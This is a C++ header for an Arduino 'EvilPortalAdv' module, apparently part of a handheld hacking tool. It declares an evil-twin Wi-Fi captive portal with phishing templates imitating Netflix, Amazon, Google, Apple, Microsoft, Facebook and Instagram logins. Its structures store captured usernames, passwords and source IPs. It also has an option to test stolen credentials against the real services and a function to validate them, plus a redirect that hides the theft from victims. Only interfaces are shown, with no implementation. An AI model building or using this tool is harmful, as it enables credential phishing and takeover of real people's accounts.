#pragma once

#include <Arduino.h>
#include <string>
#include <vector>

namespace EvilPortalAdv {

enum PhishingTemplate {
    GENERIC,         // Simple form
    NETFLIX,         // Netflix login
    AMAZON,          // Amazon sign in
    GOOGLE,          // Google account
    APPLE,           // Apple ID
    MICROSOFT,       // Microsoft account
    FACEBOOK,        // Facebook login
    INSTAGRAM,       // Instagram
};

struct CapturedCredential {
    String timestamp;
    String username;
    String password;
    String template_type;
    String sourceIP;
};

struct PortalConfig {
    PhishingTemplate template_type;
    String ssidName;
    String serverPort;
    uint32_t timeoutMs;
    bool autoValidate;           // Try credentials against real service
    bool redirectToRealService;  // After capture, redirect to real login
};

struct PortalResult {
    bool success;
    uint32_t credentialsCaptured;
    uint32_t validCredentials;   // How many actually worked
    std::vector<CapturedCredential> credentials;
    String logFile;
    String error;
};

// Start advanced evil portal with phishing template
PortalResult start(const PortalConfig &config);

// Stop portal
void stop();

// Get captured credentials
std::vector<CapturedCredential> getCredentials();

// Validate captured credentials against real service
bool validateCredential(const String &service, const String &username, const String &password);

// Get number of captured credentials
uint32_t getCredentialCount();

} // namespace EvilPortalAdv
